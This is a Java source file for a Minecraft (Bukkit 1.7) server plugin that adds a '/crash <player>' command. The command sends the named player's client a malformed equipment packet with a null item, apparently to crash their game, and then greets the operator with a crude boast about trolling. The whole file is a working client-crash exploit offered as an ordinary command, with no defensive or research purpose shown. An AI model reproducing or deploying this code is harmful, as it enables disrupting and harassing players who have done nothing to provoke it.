package net.veilmc.base.command.module.essential;

import net.minecraft.server.v1_7_R4.PacketPlayOutEntityEquipment;
import net.veilmc.base.BaseConstants;
import net.veilmc.base.BasePlugin;
import net.veilmc.base.command.BaseCommand;
import net.veilmc.util.BukkitUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_7_R4.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class CrashCommand extends BaseCommand {
	private BasePlugin plugin;

	public CrashCommand(BasePlugin plugin) {
		super("crash", "Blah");
		this.setUsage("/(command) <player>");
		this.plugin = plugin;
	}

	@Override
	public boolean onCommand(final CommandSender sender, final Command command, final String label, final String[] args) {
		if (args.length < 1) {
			sender.sendMessage(this.getUsage());
			return true;
		}

		final Player target = BukkitUtils.playerWithNameOrUUID(args[0]);
		if (target == null) {
			sender.sendMessage(String.format(BaseConstants.PLAYER_WITH_NAME_OR_UUID_NOT_FOUND, args[0]));
			return true;
		}

		PacketPlayOutEntityEquipment packet = new PacketPlayOutEntityEquipment(target.getEntityId(), 5, null);
		((CraftPlayer) target).getHandle().playerConnection.sendPacket(packet);


		sender.sendMessage(ChatColor.YELLOW + "You are a fucking troller lolololoololo packets g0d");
		return true;
	}
}